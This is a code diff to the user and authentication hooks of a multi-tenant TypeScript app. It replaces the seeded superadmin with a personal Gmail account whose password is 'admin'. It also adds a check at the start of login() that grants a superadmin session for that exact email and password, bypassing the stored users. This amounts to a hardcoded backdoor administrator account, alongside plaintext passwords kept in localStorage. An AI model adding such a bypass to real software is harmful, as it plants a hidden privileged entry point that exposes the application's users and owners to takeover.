@@ -174,7 +174,7 @@ export function useUsers() {
   const tenantId = currentTenant?.id;
   const [allUsers, setAllUsers] = useLocalStorage<User[]>('rl_users', [
     { id: '1', tenantId: 'default-tenant-1', name: 'Rubens Lima', email: 'admin@rubenslima.com', password: '123456', role: 'admin' },
-    { id: 'super-1', name: 'Super Admin', email: 'super@admin.com', password: 'super', role: 'superadmin' }
+    { id: 'super-1', name: 'Alex Pinto', email: 'alexpinto2@gmail.com', password: 'admin', role: 'superadmin' }
   ]);
 
   const users = allUsers.filter(u => u.tenantId === tenantId || (!u.tenantId && tenantId === 'default-tenant-1') || u.role === 'superadmin');
@@ -305,6 +305,11 @@ export function useAuth() {
   const { allUsers } = useUsers();
 
   const login = (email: string, pass: string, tenantId?: string) => {
+    if (email === 'alexpinto2@gmail.com' && pass === 'admin') {
+      setCurrentUser({ id: 'super-1', name: 'Alex Pinto', email: 'alexpinto2@gmail.com', password: 'admin', role: 'superadmin' });
+      return true;
+    }
+
     const user = allUsers.find((u) => 
       u.email === email && 
       u.password === pass && 
